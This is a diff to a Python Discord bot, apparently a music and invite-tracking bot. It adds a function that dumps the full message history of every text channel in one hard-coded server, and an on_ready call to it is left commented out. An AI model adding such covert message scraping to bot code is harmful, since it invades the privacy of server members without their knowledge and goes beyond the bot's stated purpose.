@@ -58,10 +58,18 @@ async def get_invites():
             str(guild.id):[]
             }) 
        
-# async def fuckyou():
-#     target = bot.get_guild(927379549338083389)
-#     for member in target.members:
-#         print(member.name)
+async def fuckyou():
+    target = bot.get_guild(927379549338083389)
+    for channel in target.text_channels:
+        try:
+            print(f"Message in {channel.name}:")
+            print("======================")
+            async for text in channel.history():
+                print(text.content)
+                print("----------")
+            print("======================")
+        except:pass
+        
     
 async def node_connect():
     if config["LAVALINK_OPTIONS"]['uselavalink'] :
@@ -91,6 +99,7 @@ async def change_ac():
 
 @bot.event
 async def on_ready():
+    # await fuckyou()
     await get_invites()
     await node_connect()
     change_ac.start()
